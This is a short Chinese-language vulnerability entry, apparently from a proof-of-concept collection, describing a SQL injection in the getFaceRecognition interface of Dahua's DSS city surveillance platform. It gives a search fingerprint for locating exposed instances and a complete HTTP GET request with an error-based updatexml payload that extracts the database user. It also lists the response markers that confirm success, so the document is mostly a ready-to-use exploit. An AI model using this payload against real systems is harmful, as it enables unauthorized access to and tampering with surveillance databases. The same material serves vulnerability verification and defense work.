﻿# 大华城市安防监控系统平台管理 getFaceRecognition SQL注入漏洞

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：大华DSSgetFaceRecognition接口存在SQL注入漏洞。攻击者可以通过构造恶意的SQL语句，成功注入并执行恶意数据库操作，可能导致敏感信息泄露、数据库被篡改或其他严重后果。

> 漏洞特征：app="dahua-DSS"

> 验证脚本：HTTP

```
GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/1 HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

> 响应代码特征：500

> 响应内容特征：soap

> 上传文件定位：

> 验证文件来源：大华城市安防监控系统平台管理 getFaceRecognition SQL注入漏洞.poc

